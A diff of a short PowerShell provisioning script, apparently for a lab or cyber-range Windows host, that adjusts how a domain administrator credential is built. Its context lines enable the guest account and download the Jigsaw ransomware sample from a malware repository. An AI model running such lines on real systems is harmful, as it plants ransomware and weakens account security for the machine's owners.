@@ -1,10 +1,11 @@
 #ps1_sysnative
 $ErrorActionPreference = 'Stop'
+$domainprefix = "domain_netbios_name"
 $domain = "domain_name"
-$computer = $env:computername
+$computer = "$env:computername"
 $password = "admin_password" | ConvertTo-SecureString -asPlainText -Force
-$username = "$domain\administrator"
-$credential = New-Object System.Management.Automation.PSCredential ($username,$password)
+$username = "$domainprefix\administrator"
+$credential = New-Object System.Management.Automation.PSCredential -ArgumentList($username,$password)
 net user guest /active:yes
 [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11"
 Invoke-WebRequest -Uri https://github.com/ytisf/theZoo/raw/master/malwares/Binaries/Ransomware.Jigsaw/Ransomware.Jigsaw.zip -Outfile c:\jigsaw.zip
